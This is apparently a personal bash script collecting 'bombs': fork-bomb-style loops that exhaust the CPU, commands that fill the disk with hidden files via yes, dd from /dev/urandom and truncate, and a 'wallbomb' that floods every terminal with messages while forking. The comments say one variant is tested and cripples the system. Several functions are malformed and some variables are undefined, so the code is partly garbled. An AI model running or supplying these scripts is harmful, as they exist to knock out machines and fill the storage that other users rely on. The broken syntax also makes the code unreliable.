#!/usr/bin/env bash
#bombs are mainly for cpu depletion but also attempt to deplete hard drive space. if CPU is maxed out this doesn't happen very quickly
#hdd-fillers are just meant to fill the hard drive quickly. CPU may be used up, but usually not fully.
#wallbomb takes up CPU and is super annoying

#yesbomb one
#oneliner
:{for(( i=0;;i+=1));do;yes balls>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
#full
:
{
	for (( i=0; ; i+=1 )); do
		yes balls > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#yesbomb two
#oneliner
:{for((i=0;;i+=1));do;man bash|yes>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
#full
:
{
	for (( i=0; ; i+=1 )); do
		man bash | yes > .$1$i & disown
	done
}
words=`cat /usr/share/dict/words`
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb three (truncate) - needs testing
#oneliner
:{for((i=0;;i+=1));do;truncate -s 1G .$1$i&disown;done};:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
#full
:
{
	for (( i=0; ; i+=1 )); do
		truncate -s 1G .$1$i & disown
	done
}
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb four (dd) - tested and rapes system
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		dd if=/dev/urandom of=./.$1$i & disown
	done
}
: kittykatz & disown
c=0
while true; do
	for word in $words; do
		: $word$c & disown
	done
	counter+=1
done

#bomb five truncate and morph - needs testing
#bomb and hdd-filler
#oneliner

#full
:
{
	for (( i=0; ; i+=1 )); do
		mv $1 .$1$i
	done
}
c=0
while true; do
	truncate -s 30G .$c
	: .$c & disown
	if [ c eq 5 ]; then
		break
	fi
done

#hdd-filler 2
dd if=/dev/urandom of=./.file & disown

#hdd-filler 3
truncate -s 1000000G .file & disown

#wallbomb
#oneliner
:(){echo "balls"|wall;:|:&disown};:&disown
#full
:
{
	echo "balls" | wall
	: | : & disown
}
: & disown
